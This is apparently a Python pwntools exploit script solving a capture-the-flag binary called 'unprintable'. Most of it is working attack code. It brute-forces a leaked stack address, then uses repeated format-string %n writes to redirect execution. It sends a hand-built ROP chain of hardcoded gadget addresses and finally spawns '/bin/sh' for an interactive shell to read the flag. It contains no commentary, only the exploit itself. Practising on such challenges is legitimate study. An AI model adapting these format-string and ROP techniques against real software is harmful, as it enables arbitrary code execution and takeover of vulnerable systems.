from pwn import *
import time
context.log_level="debug"

for i in range(1000):
  p = process('./unprintable')
  p.recvuntil("gift: ")
  addr=int(p.recvuntil("\n"),16)
  print hex(addr)
  if addr&0xffff<0x2000:
    
    #time.sleep(20)
    stack1=addr-0x7fffffffdd90+0x7fffffffdc58
    print hex(stack1)
    gdb.attach(p)

    payload="%712c%26$naaaaaa"
    payload+=("%"+str((stack1&0xffff)-718)+"c%11$hn").ljust(48,"a")+p64(0x0400726)
    p.sendline(payload)
    raw_input()
    ad=stack1+8
    print hex(ad)
    value=0x6011b0
    p.sendline("%163c%75$hhn%"+str((ad&0xffff)-163)+"c%21$hn")
    raw_input()
    p.sendline("%163c%75$hhn%"+str((value&0xffff)-163)+"c%16$hn")
    ad=ad+2
    value=value>>8
    raw_input()
    p.sendline("%163c%75$hhn%"+str((ad&0xffff)-163)+"c%21$hn")

    raw_input()
    p.sendline("%96c%16$hn%67c%75$hhn")

    raw_input()
    rop=p64(0x400833)+p64(0x6011f0)+p64(0x0400831)+p64(0x601060)+p64(0)+p64(0x4005F0)
    rop+=p64(0x400833)+p64(0)+p64(0x0400831)+p64(0x601160)+p64(0)+p64(0x400610)
    rop+=p64(0x400833)+p64(0)+p64(0x0400831)+p64(0x601060)+p64(0)+p64(0x400610)
    rop+=p64(0x400833)+p64(0x601060)+p64(0x40082A)+p64(0)+p64(0)
    rop+=p64(0x601168)+p64(0)+p64(0)+p64(0x601060)+p64(0x400810)
    p.sendline("%2093c%75$hn\x00".ljust(0x150,"a")+p64(0)*3+rop)

    raw_input()
    p.send("a"*8+"\xac")

    raw_input()
    #gdb.attach(p)
    p.send("/bin/sh".ljust(0x3b,"\x00"))
    p.interactive()
    exit()
  else:
    p.close()
#cat flag >&0
